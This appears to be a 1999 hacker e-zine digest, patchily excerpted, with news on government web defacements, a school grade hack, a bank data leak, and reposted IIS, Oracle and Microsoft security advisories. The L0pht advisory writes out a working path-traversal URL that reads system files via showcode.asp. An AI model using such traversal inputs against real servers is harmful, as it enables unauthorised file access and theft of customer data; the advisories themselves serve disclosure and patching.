   Linus on life... 
   Torvalds said, "To explain human motivation, I've come up with Linus' Law, which 
   states the three motives that drive us: survival, social life, and entertainment."
   He claimed that human history moves through each motive in cycles. "Think of sex,"
   he said. "First, it was used for procreation to survive. Then it became a social 
   bonding tool. And now it's at its apex, as entertainment. Right now, I believe 
   we're moving into an entertainment society." He added that Rome had also been an 
   entertainment society just before its powerful empire began to implode. And that 
   was when things began to go wrong -- at least, ethically speaking. Much to his 
   theoretical colleagues' chagrin, Torvalds revealed that he isn't interested in 
   human welfare, seeing as we're all doomed anyway. He'd much rather have fun than
   think about all that stuff. While the panelists and audience listened in dismay,
   Torvalds asserted that LINUX was good largely because it was entertaining, and that
   he didn't worry much about poor people because the world is unfair and that's just 
   how it is.

   Synopsis 
   ---------
   
   The purpose of this newsletter is to 'digest' current events of interest
   that affect the online underground and netizens in general. This includes
   coverage of general security issues, hacks, exploits, underground news
   and anything else I think is worthy of a look see. (remember i'm doing
   this for me, not you, the fact some people happen to get a kick/use
   out of it is of secondary importance).

    This list is NOT meant as a replacement for, nor to compete with, the
   likes of publications such as CuD or PHRACK or with news sites such as
   AntiOnline, the Hacker News Network (HNN) or mailing lists such as
   BUGTRAQ or ISN nor could any other 'digest' of this type do so.

    It *is* intended  however, to  compliment such material and provide a
   reference to those who follow the culture by keeping tabs on as many
   sources as possible and providing links to further info, its a labour
   of love and will be continued for as long as I feel like it, i'm not
   motivated by dollars or the illusion of fame, did you ever notice how
   the most famous/infamous hackers are the ones that get caught? there's
   a lot to be said for remaining just outside the circle... &lt;g>

  00.1  CONTACT INFORMATION AND MAIL DROP
        ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


     Wahoo, we now have a mail-drop, if you are outside of the U.S.A or
    Canada / North America (hell even if you are inside ..) and wish to
    send printed matter like newspaper clippings a subscription to your
    cool foreign hacking zine or photos, small non-explosive packages
    or sensitive information etc etc well, now you can. (w00t) please
    no more inflatable sheep or plastic dog droppings, or fake vomit
    thanks.

    Send all goodies to:

	    HWA NEWS
	    P.O BOX 44118
	    370 MAIN ST. NORTH
	    BRAMPTON, ONTARIO
	    CANADA
	    L6V 4H5

    WANTED!: POSTCARDS! YESH! POSTCARDS, I COLLECT EM so I know a lot of you are
    ~~~~~~~  reading this from some interesting places, make my day and get a
             mention in the zine, send in a postcard, I realize that some places
             it is cost prohibitive but if you have the time and money be a cool
             dude / gal and send a poor guy a postcard preferably one that has some
             scenery from your place of residence for my collection, I collect stamps
             too so you kill two birds with one stone by being cool and mailing in a
             postcard, return address not necessary, just a  "hey guys being cool in
             Bahrain, take it easy" will do ... ;-) thanx.



    Ideas for interesting 'stuff' to send in apart from news:

    - Photo copies of old system manual front pages (optionally signed by you) ;-)
    - Photos of yourself, your mom, sister, dog and or cat in a NON
      compromising position plz I don't want pr0n. &lt;g>
    - Picture postcards
    - CD's 3.5" disks, Zip disks, 5.25" or 8" floppies, Qic40/80/100-250
      tapes with hack/security related archives, logs, irc logs etc on em.
    - audio or video cassettes of yourself/others etc of interesting phone
      fun or social engineering examples or transcripts thereof.

    If you still can't think of anything you're probably not that interesting
    a person after all so don't worry about it &lt;BeG>

    how to exploit, and what to do to fix them.

    This list is not intended to be about cracking systems or exploiting their
    vulnerabilities. It is about defining, recognizing, and preventing use of
    security holes and risks.

    Please refrain from posting one-line messages or messages that do not contain
    any substance that can relate to this list`s charter.

    I will allow certain informational posts regarding updates to security tools,
    documents, etc. But I will not tolerate any unnecessary or nonessential "noise"
    on this list.

    Please follow the below guidelines on what kind of information should be posted
    to the Bugtraq list:

    + Information on Unix related security holes/backdoors (past and present)
    + Exploit programs, scripts or detailed processes about the above
    + Patches, workarounds, fixes
    + Announcements, advisories or warnings
    + Ideas, future plans or current works dealing with Unix security
    + Information material regarding vendor contacts and procedures
    + Individual experiences in dealing with above vendors or security organizations
    + Incident advisories or informational reporting

    Any non-essential replies should not be directed to the list but to the originator of the message. Please do not "CC" the bugtraq

     In case you couldn't figure it out hax0r is "new skewl" and although
     it is laughed at, shunned, or even pidgeon holed with those 'dumb
     leet (l33t?) dewds' &lt;see article in issue #4> this is the state
     of affairs. It ain't Stephen Levy's HACKERS anymore. BTW to all you

  00.5  HWA FAQ v1.0 Feb 13th 1999 (Abridged & slightly updated again)
        ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

    Also released in issue #3. (revised) check that issue for the faq
    it won't be reprinted unless changed in a big way with the exception
    of the following excerpt from the FAQ, included to assist first time
    readers:

    Some of the stuff related to personal useage and use in this zine are
    listed below: Some are very useful, others attempt to deny the any possible
    attempts at eschewing obfuscation by obsucuring their actual definitions.

    @HWA   - see EoA  ;-)

    !=     - Mathematical notation "is not equal to" or "does not equal"
             ASC(247)  "wavey equals" sign means "almost equal" to. If written
             an =/= (equals sign with a slash thru it) also means !=, =< is Equal
             to or less than and =>  is equal to or greater than (etc, this aint
             fucking grade school, cripes, don't believe I just typed all that..)

    AAM    - Ask a minor (someone under age of adulthood, usually <16, <18 or <21)

    AOL    - A great deal of people that got ripped off for net access by a huge
             clueless isp with sekurity that you can drive buses through, we're
             not talking Kung-Fu being none too good here, Buy-A-Kloo maybe at the
             least they could try leasing one??

   *CC     - 1 - Credit Card (as in phraud)
             2 - .cc is COCOS (Keeling) ISLANDS butthey probably accept cc's

    CCC    - Chaos Computer Club (Germany)

   *CON    - Conference, a place hackers crackers and hax0rs among others go to swap
             ideas, get drunk, swap new mad inphoz, get drunk, swap gear, get drunk
             watch videos and seminars, get drunk, listen to speakers, and last but
             not least, get drunk.
   *CRACKER - 1 . Someone who cracks games, encryption or codes, in popular hacker
                 speak he's the guy that breaks into systems and is often (but by no
                 means always) a "script kiddie" see pheer
              2 . An edible biscuit usually crappy tasting without a nice dip, I like
                  jalapeno pepper dip or chives sour cream and onion, yum - Ed

    Ebonics - speaking like a rastafarian or hip dude of colour &lt;sic> also wigger
              Vanilla Ice is a wigger, The Beastie Boys and rappers speak using
              ebonics, speaking in a dark tongue ... being ereet, see pheer

    EoA    - End of Article or more commonly @HWA

    EoD    - End of diatribe (AOL'ers: look it up)

    FUD    - Coined by Unknown and made famous by HNN &lt;g> - "Fear uncertainty and doubt",
            usually in general media articles not high brow articles such as ours or other
            HNN affiliates ;)

    du0d   - a small furry animal that scurries over keyboards causing people to type
             weird crap on irc, hence when someone says something stupid or off topic
             'du0d wtf are you talkin about' may be used.

   *HACKER - Read Stephen Levy's HACKERS for the true definition, then see HAX0R

   *HAX0R - 1 - Cracker, hacker wannabe, in some cases a true hacker, this is difficult to
            define, I think it is best defined as pop culture's view on The Hacker ala
            movies such as well erhm "Hackers" and The Net etc... usually used by "real"
            hackers or crackers in a derogatory or slang humorous way, like 'hax0r me
            some coffee?' or can you hax0r some bread on the way to the table please?'

            2 - A tool for cutting sheet metal.

    HHN    - Maybe a bit confusing with HNN but we did spring to life around the same
             time too, HWA Hax0r News.... HHN is a part of HNN .. and HNN as a proper
             noun means the hackernews site proper. k? k. ;&

        Hi.
              
        A few weeks ago, it was posted that ICQ99 stores the password
        used to access the ICQ network in plain-text in the .DAT files.
        We have written a program that demonstrates this by parsing
        these .DAT files for password and showing it to the user.
        It can be downloaded at http://www.encrsoft.com/products.html#icqpass
              
        Note: The option to save password can be turned off in ICQ's
        Security & Privacy settings.

        Do Web sites tell their visitors whether they collect personal data and how they use
        it? In a separate sampling of 364 randomly selected sites, 65.7 percent gave privacy
        notices (much better then last year when only 14% of sites gave those kind of
        notices). Read about the study on ZdNet.

       Office 2000, would be well advised to avoid trying to reduce the size of its massive footprint
       by deleting files to recover space. Even the most innocuous little text files seem to have some
       strange and arcane purpose in BillÆs Great Scheme Of Things.For example deleting file DELME.txt
       is going cause starting install procedure every time Office files are executed.

       The recent release of letters claiming outrages damages from companies allegedly 
       targeted by Kevin Mitnick have not pleased the prosecution. The prosecution has 
       filed a motion to have the defense held in contempt for releasing the information.
       A hearing scheduled for tomorrow originally scheduled to determine Kevin's
       future earnings potential may also address this motion. The hearing is tomorrow
       (Tuesday) at 10:00 at: U.S. Central District of California Western Division - Spring

      contributed by cult hero 
      In response to the recent NATO bombing of the Chinese embassy in Belgrade some people have started
      attacking web sites. The US Embassy in China, The DOE, and the Department of Interior are a few of 
      the web sites that have had their web pages changed as a  direct result of the bombings. Most of 
      the slogans posted on the pages are extremely anti USA and NATO and and evoke Chinese nationalism 
      and patriotism.

      May 9, 7:51am PT ù Protests over NATOÆs bombing of the Chinese embassy in Belgrade have spilled into

           Enraged hackers apparently attacked the official Web site of the U.S. embassy in China yesterday, took

           As a result, the Department of Interior Web site on Sunday displayed pictures of the Chinese journalists
      killed on Saturday after NATO accidentally bombed the Chinese embassy in Belgrade. The Department of
      Energy site read ôProtest USAÆs Nazi action.ö 
           It was unclear whether the hacking was done by Chinese or not, though several messages on Chinese
      Web sites and message boards based in China claimed that it was. 
           According to Chinese news reports, hackers also launched attacks on the official White House site,
      which features an automated restoration function set to operate within five seconds of an attack. 
          The messages posted on attacked sites were vitriolic, patriotic and, in some cases, poetic. 
           One read ôDown with the Yanks. The fate of the Chinese people has reached the most critical pointö ù a
      play upon the lyrics of the Chinese national anthem, reflecting a similar patriotic call after the Japanese
      invaded China in 1937. 
           A poem was posted that has appeared before other civilian unrests in China such, particularly in 1976
      after the death of Premier Zhou Enlai. A rough translation: ôI grieve while the wolves howl/I cry while the
      beasts cheer/I shower the martyrs with my tears while unsheathing the sword.ö 
           Communist slogans also appeared, a rarity in todayÆs China. One of the hacked sites declared ôThis hill
      has been taken over by the commies.ö 

      Message Boards Overflowing
      Bulletin boards based in China were full of messages condemning the U.S. and NATOÆs mistaken bombing
      of the Chinese embassy. 
           ôYou think you have a strong army without human nature and a great number of brazen politicians just
      like you ... pose as the world cop and think the world must run under your rules, your human rights, your
      democracy," one message read. 
          The Department of EnergyÆs home page also had a message that read, ôWe are Chinese hackers that
      takes no cares about politics, but we can not stand by seeing our Chinese reporters been killed.ö 
          The hackersÆ own site at killusa.abc.yesite.com, a repository of hacking strategies, had nearly 1,000
      messages Sunday, either reporting sites being hacked or expressing anti-American sentiments. 
           Rumors flew thick and fast, among them that NATO had again bombed the Chinese embassy in
      Belgrade and that Chinese President Jiang Zemin had said that China must be prepared to go to war.
      Another stated that the intelligence reports provided to NATO prior to the embassy bombing were supplied
      by a NATO officer angry with China over its treatment of Tibet. 
           A contributor to the page also suggests manning a full-scale attack on American Web sites,
      disseminating computer viruses, and attacking the sites continuously in a method the hackers term
      ômachine-gunning.ö Another suggests targeting financial sites.

      Anti-NATO Hackers Sabotage 3 Web Sites
      By Stephen Barr
      Washington Post Staff Writer
      Wednesday, May 12, 1999; Page A25
      
      
      Computer hackers protesting NATO's bombing of the Chinese Embassy in
      Belgrade sabotaged three U.S. government Web sites, Clinton administration
      officials said yesterday. 
      
      
      The hackers placed anti-NATO messages on Web pages operated by the Energy
      Department, the Interior Department and one Interior bureau, the National
      Park Service. The cyber-attacks late Sunday forced the Energy Department
      and the Park Service to shut down their home pages for much of Monday. 
      
      
      The Interior Department hacker "was traced back to China by DOI computer
      experts," said Interior spokesman Tim Ahearn. "The FBI is looking into it
      now." 
      
      
      Energy spokeswoman Michelle Del Valle said, "We don't know who did it,"
      but she noted that "the hackers claimed in a message that they were
      Chinese." She said the DOE has started an investigation. 
      
      
      The officials said the Web pages were pulled off line quickly after the
      sabotage was discovered. Electronic firewalls protected other parts of the
      departmental computer systems from attack, they said. 
      
      
      Del Valle said hackers placed the following message, with parts in
      imperfect English, on the DOE's site: 
      
      
      "Protest U.S.A.'s Nazi action! Protest NATO's brutal action! We are
      Chinese hackers who take no cares about politics. But we can not stand by
      seeing our Chinese reporters been killed which you might have know.
      Whatever the purpose is, NATO led by U.S.A. must take abosolute
      responsibility. You have owed Chinese people a bloody debt which you must
      pay for. We won't stop attacking until the war stops!" 
      
      
      NATO bombed the Chinese Embassy in Belgrade on Saturday, killing three
      people, including at least one journalist. U.S. and NATO officials said
      the bombing was an accident caused by reliance on an outdated map. 
      
      
      At Interior, Ahearn said hackers sabotaged the home page about 10 p.m. 
      Sunday, replacing photographs and information with "pictures of Asian
      people and Chinese writing." It took about five hours to take the page off
      the Web, restore data and bring it back on line. 
      
      
      Another federal Web site ¡ Recreation.gov ¡ was hit April 30 and was down
      until May 3, Ahearn said. 
      
      
      The White House Web site was shut down Monday night after attempts were
      made Monday morning to hack into the system. White House spokesman Barry
      Toiv said it was shut down through last night to try to determine whether
      hackers tampered with the White House computer system. Toiv said he did
      not know who was responsible.

      The Egg, Cracked 
      
      From HNN http://www.hackernews.com/


      contributed by Code Kid 
      A UK internet savings bank known as the Egg, owned by Prudential, was the victim of a security flaw that
      allowed some users to see other users confidential financial information. The article goes on to explain a
      classic example of poor implementation. Just because they use encryption does not mean that they are
      secure. The bank claims that they have solved the problem.

      Crack in Egg's security 

      It's security, but not as you'd want it 

      UK Internet savings bank Egg, owned by Prudential, has rushed to close a security flaw that allowed some users
      to see other potential savers' confidential financial information. 

      Egg did not make the security flaw public, but BBC News Online was alerted to the problem by two of its
      readers. 

      One of them called the lack of security "very worrying". 

      New site with flaws

      The fault developed 10 days ago when Egg moved its operations fully to the Internet and relaunched its
      Website with new technology. 

      Several people who tried to apply online for an Egg account, suddenly saw somebody else's application
      flash up on the screen - including confidential information like home address, phone numbers, e-mail address, 
      the amount of money to be invested and other details. 

      Two shocked customers alerted Egg to the problem, whose IT team then desperately tried to track down the
      fault. 

      Peter Marsden, IT director at Egg, told BBC News Online that the flaw was corrected during the afternoon of
      the same day. 

      Encryption breaches security 


      Ironically, the problem was triggered by Egg's own security measures. People who try to apply for
      an Egg account are asked to log on to the system by identifying themselves with their e-mail address and a
      password. 

      This information is then encrypted and used to 'log the session', i.e. make sure that the computer makes the
      right connection between the Internet user and its own electronic records. 

      However, the new system was not configured to cope with long e-mail addresses. Every e-mail address longer
      than about 30 letters was automatically truncated. 

      Because of the encryption process, people with long, albeit very different e-mail addresses, could end up with
      identical IDs. 

      The flaw became apparent when, for example, mandatory sections in the application form were not filled
      in correctly and Egg's web server sent back the page demanding additional information. 

      At this point, a page containing confidential information could be sent to somebody else with the identical ID. 

      If hackers had been aware of the security flaw, they could have deliberately flooded Egg's servers, identifying
      themselves with long, but false e-mail addresses, hoping to glean personal information of Egg customers.

      Egg has now ironed out the problem and changed the system so it can cope with e-mail addresses of any
      length. 

      Online, and growing 

      The Egg savings account has been a phenomenal success, exceeding the wildest expectations of parent
      company Prudential. 

      Within six months the company managed to reach its five-year target, with 500,000 customers who have put
      ú5bn in its accounts. 

      To help its customers to get online, the Egg has launched a free Internet access service, similar to
      Dixon's succesful Freeserve. 

      However, the success has come at a price. The Egg venture is losing millions, and Prudential does not
      expect it to make money for some years.

       Student Changes Grades

       An unidentified student of Douglas County High School has admitted to breaking into the schools
       computer system and changing the grades of four students. Sgt. Attila Denes, spokesman for the 
       Douglas County sheriff called their technique "ingenious". Of course the article does not give

       Boy admits altering Douglas High grades 

      By Tillie Fong
      Denver Rocky Mountain News Staff Writer


      CASTLE ROCK -- Four Douglas County High School students decided
      last month they could hack their way into better grades, authorities said
      Thursday.

      One 16-year-old boy broke into the school's record system and raised
      some low marks.

      "The technique they used was ingenious," said Sgt. Attila Denes,
      spokesman for the Douglas County sheriff.

      The hacker figured out a way to get access to records via the school's
      library computer and fax machine. He also used commercially available
      software to obtain the password.

      The boy apparently got into the system at least 30 times starting in
      mid-April.

      "He changed an average of two to three grades for each student and
      changed the failing or near failing grades to A's and B's," Denes said.

      On April 30, school employee Joan Elderton noticed that several changes
      were made to four students' grades without authorization, and notified
      assistant principal Ron England.

      Bruce Caughey, spokesman for Douglas County schools, said one of the
      things that gave the hacker away was the time and date log the computer
      system keeps.

      "School officials were able to determine when the changes were made," he
      said.

      That same day, administrators called in the hacker and his father.

      "The student initially denied everything," Denes said.

      But the following Monday, he submitted a letter to school officials in which
      he admitted making the changes and described how he did it.

      At that time, he also said he had altered the grades for three other
      students.

      "The school administrator subsequently talked to the other three boys, and
      they each said that they had asked this other boy to change the grades on
      their behalf," Denes said.

      Since then, the hacker has been suspended for 10 days, and the other
      three students for five days.

      They also face criminal charges, and possible expulsion.

      Possible charges against the hacker include forgery, use of forged
      academic records and criminal tampering.

      The other three boys are looking at criminal solicitation and use of forged
      academic records charges. None of the boys was named because of their
      age.

      "The students showed quite a bit of resourcefulness," said Denes. "It's too
      bad it couldn't have been channeled more positively."

      IBMs Gift to Australias Security

      It is hard to tell if it is the person being written about or the reporter doing the writing but 
      this "news article" makes it seem that Guy Denton was sent from IBM to save all of Australia from
      cyber attacks. A prime example of sensationalistic advertising hiding as "news".

      Hacker tracker plays a risky game

      Date: 08/05/99
       
      By JAMES WOODFORD, Science Writer
       
      Guy Denton is the hackers' policeman, the keeper of knowledge so central to our society that should he
      change sides he would be one of the most dangerous men on Earth.
      
      His job is to enter other people's computer systems, detect the presence of illegal hackers, prevent
      systems from being attacked and to slowly - when students have proven they can be trusted - teach a new
      generation of "ethical" hackers how to hunt down bad guys in cyberspace.
      
      An ethical hacker is a computer expert who legally enters clients' computer systems searching for chinks
      in security.
      
      Mr Denton said hacking is the "getting of any information that you do not have the right to see".
      
      It is also the wreaking of havoc within computer systems by entering and changing codes so that a company
      or bureaucracy's business is disrupted.
      
      Mr Denton, 40, an American, is in Australia to take a new crop of IBM recruits to higher levels of 
      anti-hacking skills.
      
      The company searches for talented university graduates with the right skills to become professional
      ethical hackers with the right psychological makeup to ensure that the skills they are taught are not
      misused. Mr Peter Watson, an ethical hacker also with IBM, said: "We tend to stay away from people who 
      hold themselves out as hackers.
      
      "But we look for certain personality traits - puzzle-solving ability, inquisitiveness - people who are
      not comfortable until they have been all the way through something.
      
      "They are people who have got to have the full picture."
      
      They are also young - most, said Mr Watson, were in their mid-20s.
      
      "If you look back through history we have always had things like the Silk Road," Mr Watson said. "They were
      always exposed to bandits and pirates and you are really just seeing our trade routes moved to an electronic 
      basis.
      
      "We are the security guards of the Internet."
      
      The Australian team of ethical hackers - their numbers are a closely guarded secret - work out of a darkened
      room on Sydney's Lower North Shore with a bank of computers from where just about any computer system in the
      world can be accessed.
      
      Companies concerned about the security of their systems pay a fee of between $15,000 and $40,000 plus costs 
      to allow the ethical hackers to break into their network.
      
      "In some circumstances they don't tell their computer system administrators that there is a hack going on," 
      Mr Denton said.
      
      Once the ethical hackers have entered the system they then wait to see how long it takes for their presence
      to be detected or whether once it is detected proper
      procedures are followed.
      
      If the "attack" is not detected at all, then advice is given to the client on the installation of a "warning
      intrusion alarm system" or an upgrading of security.
      
      "The level of activity is occurring a lot more," Mr Watson said. "We are starting to see a lot of activity."
      
      Until recently most hacking activity in Australia tended to take place after hours, when people had left work
      or university students had finished their day's study.
      
      However, as more people from overseas are realising that Australia is a promising hacking target, the 
      intrusions are occurring more on a 24-hour basis as people dial
      in from places like the United States.
      
      Hackers are able to access a company's computer system by calling in externally and then using programs to 
      actually enter the systems.
      
      Advice on how to enter computer systems is readily available on the Internet and magazines give tips on how
      to enter various systems. Computer hacking programs are also now being sold illegally.
      
      However, in spite of the increasing sophistication being employed by hackers, by far the biggest volume of
      intrusions are what are described as "script kiddies".
      
      The greatest fear for the ethical hacker is the anonymous computer whiz or somebody hell bent on mischief 
      working from within.
      
      "A rogue employee typically does not make themselves known," said Mr Denton.
      
      The ethical hackers acknowledge that their work gives them the power to cause huge problems for society and
      have to work ensuring that the staff they train do not cross the line to illegality.
      
      "I could cause a huge amount of chaos," Mr Denton said. "But I am not going to do that.
      
      "We have to be sure that our guys are not going to get bored and do things they are not supposed to do."

               Due to recent events, the downfall of g0at security has become imminent. 
       
               These incidents include:
       
       - Legal problems of some of our members.
       - Recent hacking crack downs launched by many governments.
       - The recent takeover of our channel, #feed-the-goats (Efnet).
       - Losing our server due to a sloppy hack by one of our members (/me looks away).
       - Losing our text files due to our domain being wiped off the server.

               we are finished. Unlike other groups we most likely will not spawn back.
       
       [Brief history of g0at security]
       
               One day in Feb. I believe, ech0 and myself (Debris), decided to irc. ech0 informed me that
               occasionally hung out in a channel he, himself created called #feed-the-goats. From there,
               members of a popular group, HcV along with members of Global Hell, began coming. ech0 and 
               myself decided that we wanted to be as elite as our peers in #rootworm, so we made a webpage.
               The purpose of the page was to mock and satirize hacker culture in general. Our first document
               entitled "g0at declares war on LoU" mocked the Legion of the Underground's new attempt at 
               becoming legit among a handful of other aspects of their organization.
               
               Our original url (goat.sphix.com) quickly grew in size and popularity, and our channel became 
               more populated. The hacks began soon after, some by members and a lot by non-members. g0at's 
               highpoint came soon after the controversial yahoo hack. Our popularity skyrocketted and the 
               name g0at became known to all (unfortunatly we got all the l33t0s in our channel and wouldn't
               go away). The fun and games continued up until April, when all the 'incidents' began. Then 
               May was the last straw.
       
       [Where do we go from here]
       
               Most members will most likely go their own ways. Many still hang in #feed-the-goatz (our new 
               channel). No more text releases will come from g0at, our webpage will remain down, our archive
               on attrition.org will stay the same and nothing will be heard of us as a group.
       
       [Thanks and greets]
       
               Thanks to all that supported our group and enjoyed the text we wrote to amuse the unintelligent.
               Greets to all our 12 members, HNN, attrition, net-security, HWA.hax0r.news. JP, for entertaining
               us for hours with your hacker journalism. And thanks to all the rest.
       
       
       Finally.... it's been fun. It's been awesome being associated with g0at.
       
       You can still reach us at g0at@attrition.org for further questions or comments or whatever (I just want email)

      ANOTHER BROWSER VULNERABILITY
      by BHZ, Tuesday 11th May 1999 on 2:52 pm CET
      Georgi Guninski reports another browser bug to BugTraq: "There is a design flaw in
      both Internet Explorer 5.0 and Netscape Communicator 4.51 Win95 (guess all 4.x
      versions of both browsers are vulnerable too) in the way they handle bookmarks. The
      problem arises if the user bookmarks (adds to favorites) and later chooses a specially
      designed javascript: URL. When the bookmark is chosen later, the JavaScript code in
      it is executed in the context (the same domain and protocol) of the document opened
      prior to choosing the bookmark. So, the JavaScript code has access to documents in
      the same domain. An interesting case is choosing the bookmark when the active
      document is a local file (the protocol is "file:") - then the JavaScript code has access
      to local files and directories".

 13.0 IIS 2.0 "Security" by p0lix
      ~~~~~~~~~~~~~~~~~~~~~~~~~~~

      IIS 2.0 "Security"

 

      Microsoft is wrestling with security holes in its Site Server and Internet Information Server (IIS)
      products that expose system files -- including potentially sensitive Internet-commerce customer
      files or databases -- through any remote web browser. 
      
      The flaws, discovered by members of l0pht are caused from default configurations that install three
      active server pages without proper access control list settings.
      
      LOpht has warned that E-commerce server information -- including transaction logs, credit card
      numbers, and other customer information -- are potentially at risk. 
      
      "There is even E-commerce shopping cart software that stores administrative passwords in simple
      text files," LOpht warned. 
      
      Using these active server pages -- viewcode.asp, codebrws.asp, and showcode.asp -- someone could
      view sensitive or compromising information from that system. The problem affects Versions 3.x of
      Site Server and 4.x of IIS; both are used in E-commerce infrastructures. 
      
      It's bad if you've got an e-commerce database installed on that system, because almost anyone can
      use Active Server Pages to locate databases and get into database information, and you can also
      view the source code of HTML pages. 
      
      A WebTrends engineer found that the holes were so wide he could use them on an Internet search
      engine and determine what servers were similarly configured. 
      
      He was able to view the parameters of any file and you can get information that will lead you
      through all the systems throughout the network.
      
      Microsoft officials were working on new versions of the tools to correct the vulnerability, which
      security product manager Scott Culp said should be complete by early next week, and planned to
      issue a security bulletin on the issues Friday afternoon. 
      
      In the meantime, potential workarounds include checking the Active Server Pages settings, or
      deleting the tools altogether. 
      
      As a Web site operator, you want to give customers the opportunity to look at the code on their
      page, however, this vulnerability allows somebody to misuse these tools to possibly look at other
      files on the server.

 14.0 l0pht Security Advisory on MS IIS 4.0
      ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ 

               L0pht Security Advisory


       -------------
       URL Origin:    http://www.l0pht.com/advisories.html
       Release Date:  May 7th, 1999
       Application:   Microsoft IIS 4.0 Web Server
       Severity:      Web users can view ASP source code and other sensitive
                      files on the web server
       Author:        weld@l0pht.com
       Operating Sys: Microsoft NT Server 4.0
       --------------
       
       
       I. Description
       
       
       Internet Information Server (IIS) 4.0 ships with a set of sample files
       to help web developers learn about Active Server Pages (ASP).  One of
       these sample files, showcode.asp, is designed to view the source
       code of the sample applications via a web browser. The showcode.asp
       file does inadequate security checking and allows anyone with a web
       browser to view the contents of any text file on the web server.  This
       includes files that are outside of the document root of the web
       server.
       
       
       Many ecommerce web servers store transaction logs and other customer
       information such as credit card numbers, shipping addresses, and
       purchase information in text files on the web server.  This is the
       type of data that could be accessed with this vulnerability.
       
       
       The L0pht would like to thank Parcens for doing the initial research on
       this problem.
       
       
       II. Details
       
       
       The showcode.asp file is installed by default at the URL:
       
       
       http://www.someserver.com/msadc/Samples/SELECTOR/showcode.asp
       
       
       It takes 1 argument in the URL, which is the file to view. The format of
       this argument is:
       
       
       source=/path/filename
       
       
       So to view the contents of the showcode.asp file itself the URL would be:
       
       
       http://www.someserver.com/msadc/Samples/SELECTOR/showcode.asp?source=/msadc/Samples/SELECTOR/showcode.asp
       
       
       This looks like a fairly dangerous sample file. It can view the contents
       of files on the system. The author of the ASP file added a security check
       to only allow the viewing of the sample files which were in the '/msadc'
       directory on the system. The problem is the security check does not test
       for the '..' characters within the URL.  The only checking done is if the
       URL contains the string '/msadc/'.  This allows URLs to be created that
       view, not only files outside of the samples directory, but files anywhere
       on the entire file system that the web server's document root is on.
       
       
       For example, a URL that will view the contents of the boot.ini file, which
       is in the root directory of an NT system is:
       
       
       http://www.someserver.com/msadc/Samples/SELECTOR/showcode.asp?source=/msadc/Samples/../../../../../boot.ini
       
       
       This URL requires that IIS 4.0 was installed in its default location.
       
       
       
       III. Solution
       
       
       For production servers, sample files should never be installed so delete
       the entire /msadc/samples directory.  If you must have the showcode.asp
       capability on development servers the showcode.asp file should be modified
       to test for URLs with '..' in them and deny those requests.

 15.0 X-Force Security advisory on Oracle 8: Multiple file system vulnerabilties      
      ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
      
       ISS Security Advisory
       May 6, 1999
       
       
       Multiple File System Vulnerabilities in Oracle 8
       
       
       Synopsis:
       
       
       Internet Security Systems (ISS) X-Force has discovered that multiple
       vulnerabilities exist in Oracle 8 that may allow local attackers to exploit
       weaknesses in Oracle administrative tools.  Oracle is the market leader in
       enterprise database solutions. Attackers may use these vulnerabilities to
       amplify their privilege to that of the 'oracle' user.  By default, the
       oracle user controls the entire Oracle database system.  Attackers may
       launch local denial of service attacks against the database as well as alter
       or manipulate data.
       
       
       
       Affected Versions:
       
       
       ISS X-Force has determined that most current versions of Oracle 8 for Unix
       are vulnerable.  These versions include 8.03, 8.04, 8.05, and 8.15.  Oracle
       8 for Windows NT is not affected by these vulnerabilities.
       
       
       Description:
       
       
       The Oracle 8 distribution is shipped with many administrative utilities that
       are owned by the oracle user with the setuid bit enabled. Several of these
       utilities implement insecure file creation and manipulation.  These
       utilities also trust Oracle-related environment variables.  The combined
       effect of these vulnerabilities may allow local attackers to create, append
       to, or overwrite privileged oracle files.  Certain vulnerabilities exist
       that may allow local attackers to execute arbitrary commands as the oracle
       user.  Attackers may also be able to permanently elevate their privilege to
       that of the oracle user.
       
       
       Temporary files that follow symbolic links are a common source of
       vulnerabilities in setuid executables.  Administrators should remove or
       restrict access to setuid executables if possible.
       
       
       Developers of setuid programs need to take special precautions to prevent
       the introduction of vulnerabilities of this nature. ISS X-Force recommends
       that all Unix developers become familiar with Matt Bishop's secure
       programming guide, available at
       http://olympus.cs.ucdavis.edu/~bishop/secprog.html
       
       
       Fix Information:
       
       
       ISS X-Force has worked with Oracle to provide a patch for the
       vulnerabilities described in this advisory.  Oracle has provided the
       following FAQ to answer any questions concerning these vulnerabilities.
       
       
       Q: I've heard about a setuid security issue with the Oracle database? What
       is this all about?
       A: On Unix platforms, some executable files have the setuid bit on. It may
       be possible for a very knowledgeable user to use these executables to bypass
       your system security by elevating their operating system privileges to that
       of the Oracle user.
       
       
       Q: Which releases are affected by this problem?
       A: This problem affects Oracle data server releases 8.03, 8.0.4, 8.0.5, and
       8.1.5 on Unix platforms only.
       
       
       Q: Can I correct this problem or do I need a patch?
       A: This problem can easily be corrected. The customer can download the patch
       from the Oracle MetaLink webpages at http://www.oracle.com/support/elec_sup.
       The patch is a Unix shell script. This shell script should be run
       immediately, and also run after each relink of Oracle.
       
       
       Q: What is Oracle doing to fix this problem?
       A: Effective immediately, Oracle will provide the patch on Oracle's
       Worldwide Support Web pages. Oracle will ensure the patches are incorporated
       into future releases of Oracle8i (8.1.6) and Oracle8.0 (8.0.6)
       
       
       Q: What is Oracle doing to notify users about this problem now?
       A: Oracle is notifying all supported customers, via the Oracle Worldwide
       Support Web pages, of this issue so they can address it as required.
       
       
       ISS X-Force also recommends that all administrators complete a proactive
       survey on the use or potential misuse of setuid bits on privileged
       executables on their systems.
       
       
       Credits:
       
       
       These vulnerabilities were primarily researched by Dan Ingevaldson of the
       ISS X-Force.

      Summary
      =======
      Microsoft has identified a vulnerability that occurs in some file viewers
      that ship as part of Microsoft (r) Internet Information Server and Site
      Server. The vulnerability could allow a web site visitor to view, but not to
      change, files on the server, provided that they knew or guessed the name of
      each file and had access rights to it based on Windows NT ACLs.
      
      
      Microsoft is releasing this security bulletin to inform customers of the
      vulnerability and enable them to eliminate it immediately. Patches are being
      developed for the affected file viewers, and will be available shortly. When
      they are available, an update to this security bulletin will be released.
      
      
      Issue
      =====
      Microsoft Site Server and Internet Information Server include tools that
      allow web site visitors to view selected files on the server. These are
      installed by default under Site Server, but must be explicitly installed
      under IIS. These tools are provided to allow users to view the source code
      of sample files as a learning exercise, and are not intended to be deployed
      on production web servers. The underlying problem in this vulnerability is
